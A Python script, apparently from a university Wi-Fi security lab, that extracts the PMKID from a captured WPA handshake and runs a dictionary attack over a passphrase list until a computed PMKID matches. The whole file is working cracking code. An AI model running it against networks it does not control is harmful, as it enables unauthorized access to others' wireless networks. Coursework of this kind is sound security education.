#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Récupère la valeur du PMKID dans une capture au format .pcap
"""

__author__    = "Dylan Canton & Christian Zaccaria"
__copyright__ = "Copyright 2022, HEIG-VD"
__license__   = "GPL"
__version__   = "1.0"
__email__     = "dylan.canton@heig-vd.ch, christian.zaccaria@heig-vd.ch"
__status__    = "Prototype"

from inspect import _ParameterKind
from scapy.all import *
from binascii import a2b_hex, b2a_hex

from sqlalchemy import false
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("PMKID_handshake.pcap") 
handshake_f1 = None
beacon       = None

# Récupération des frames Beacon et handshake 1
# On trouve ici le handshake 1 de l'AP vers la STA
for pkt in wpa:
    if handshake_f1 is None and pkt.haslayer("EAPOL"):
        DS = pkt.FCfield & 0x3
        to_DS = DS & 0x1 != 0
        from_DS = DS & 0x2 != 0
        if from_DS and not to_DS:
            handshake_f1 = pkt
            break

# Une fois le handshake 1 trouvé, on trouve le beacon en comparant le BSSID
if handshake_f1 is not None :
    for pkt in wpa:
        if handshake_f1.addr2 == pkt.addr2:
            beacon = pkt
            break

# Important parameters for key derivation - most of them can be obtained from the pcap file
A           = "PMK Name" #this string is used in the pseudo-random function
ssid        = beacon.info.decode("utf-8")
# Récupération de la valeur du MPKID (16 derniers bits du handshake 1)
pmkid       = b2a_hex(handshake_f1.load[-16:])

# Replacement des ":" par "" dans les MAC, ceci pour les transformer en bytes
APmac       = a2b_hex(str.replace(handshake_f1.addr2, ":", ""))
Clientmac   = a2b_hex(str.replace(handshake_f1.addr1, ":", ""))

# Authenticator and Supplicant Nonces
# Depuis le key descriptor type, on prend ANonce, respectivement SNonce (avec RAW)
ANonce      = handshake_f1.load[13:45]

print ("\n\nValues used to derivate keys")
print ("============================")
print ("SSID: ",ssid,"\n")
print ("AP Mac: ",b2a_hex(APmac),"\n")
print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
print ("AP Nonce: ",b2a_hex(ANonce),"\n")

passPhraseFile  = "passPhrases.txt"
passPhraseFound = "Not found"
ssid            = str.encode(ssid)

# Parcourir le fichier de passPhrase
with open(passPhraseFile) as passPhraseFile:
    for passPhrase in passPhraseFile:
        #Enlever le \n en fin de ligne si présent
        if passPhrase[-1:] == "\n":
            passPhrase = passPhrase[:-1]

        #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        passPhrase = str.encode(passPhrase)
        pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)

        # Calcul du PMKID
        pmkid_temp = hmac.new(pmk, str.encode(A) + APmac + Clientmac, hashlib.sha1)

        #Comparer le PMKID calculé au PMKID récupéré, si il y a correspondance alors passPhrase trouvée
        if pmkid_temp.hexdigest().encode()[:-8] == pmkid:
            print ("\nResults of the key expansion")
            print ("=============================")
            print ("PMK:\t\t",pmk.hex(),"\n")
            print ("PMKID:\t\t",pmkid.hex(),"\n")
            passPhraseFound = passPhrase.decode()
            break


print ("\nResult of the passPhrase")
print ("=============================")
print ("PassPhrase is :\t", passPhraseFound,"\n")
    